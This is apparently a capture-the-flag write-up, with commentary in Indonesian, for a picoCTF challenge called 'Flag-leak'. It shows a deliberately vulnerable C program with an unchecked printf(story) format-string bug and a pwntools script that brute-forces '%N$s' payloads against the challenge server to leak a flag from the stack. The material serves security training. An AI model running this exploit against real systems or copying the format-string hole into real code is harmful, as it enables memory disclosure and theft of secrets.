# Flag-leak
## Problem
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```

## Diketahui
Flag sudah diopen dan dicopy ke variable flag, lalu terdapat printf(story) yang kita bisa gunakan untuk membaca isi variable flag.\
Akan tetapi, tidak terdapat leaking address manapun sehingga kita tidak bisa mendapatkan offset dan base dari vuln maupun libc sehingga kita harus brute

## Payload
```
from pwn import *

SERVER = "saturn.picoctf.net"
PORT = 52480


# Coba baca string di berbagai offset
for i in range(1, 128):
    try:
        p = remote(SERVER, PORT)
        payload = f'%{i}$s'.encode()
        p.sendline(payload)
        output = p.recvall(timeout=2).decode()
        if 'babactf' in output or 'pico' in output or '{' in output:
            log.success(f"Flag found at offset {i}: {output}")
            break
        p.close()
    except:
        p.close()
        continue

```